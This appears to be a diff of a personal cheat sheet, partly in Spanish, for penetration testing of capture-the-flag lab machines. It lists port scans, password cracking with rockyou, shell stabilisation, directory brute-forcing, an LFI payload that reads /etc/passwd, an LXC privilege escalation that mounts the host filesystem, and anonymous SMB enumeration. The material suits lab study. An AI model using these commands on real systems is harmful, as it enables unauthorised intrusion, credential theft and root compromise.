@@ -4,6 +4,7 @@ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.46 | grep ^[0-9] | cut -d '/' -f 1
 nmap -sC -sV -p$ports 10.10.10.46
 Masscan -p 1-65535 10.10.10.30 -e tun0 –rate=1000
 nmap -sU -v 10.10.10.55
+nmap -sV -sC -p- -Pn 10.10.10.49 --min-rate=10000
 
 ***************************************************************Cracking password**
 
@@ -13,12 +14,30 @@ nmap -sU -v 10.10.10.55
   john --pot=test.pot --wordlist=/usr/share/john/password.lst hash
   john hash -wordlist=/usr/share/wordlists/rockyou.txt
   
+  Para saber que tipo de hash, nota: en el archivo hash.txt va el hash a crackear.
+  john --wordlist=/usr/share/john/password.lst --rules= hash.txt
+  
+  una vez identificado se lanza el siguiente comando
+  john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash.txt
+  
 
 ************************************************************* comandos para después de obtener una shell**
 Permiten que se pueda interactuar con la shell para poder usar las teclas subir bajar y digitar bien en editores de texto.
 
-Sst raw -echo
-Fg to foreground
+ctrl+z
+echo $TERM && tput lines && tput cols
+
+# for bash
+stty raw -echo
+fg
+
+# for zsh
+stty raw -echo; fg
+
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <num> columns <cols>
 
 Comando para obtener una shell de linux cuando se tiene una conexión con nc.
 
@@ -33,6 +52,13 @@ python3 -c "import pty; pty.spawn('/bin/bash')"
 Scan subdirectory
 
 gobuster dir -u http://10.10.10.29/ -w /usr/share/wordlists/dirb/common.txt
+dirb http://10.10.10.6
+gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirb/big.txt
+gobuster dir -u https://10.10.10.7/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k
+
+scan files & folders
+
+  gobuster dir -u http://10.10.10.48 -w /usr/share/wordlists/dirb/big.txt
 
 revisando LFI
 http://10.10.10.55/?file=../../../../etc/passwd
@@ -49,6 +75,7 @@ Linux uname -r
 ************************************************************Servidor HTTP Temporal *************************************
 
 python3 -m SimpleHTTPServer 80
+python3 -m http.server 8000
 
 ************************************************************Firewall rules******************************************
 iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
@@ -85,3 +112,7 @@ lxc init rootimage ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite
 lxc exec ignite /bin/sh
+
+**********************************************************smb************************************************
+smbclient -N -L \\10.10.10.27\\
+smbclient -N \\10.10.10.27\backups
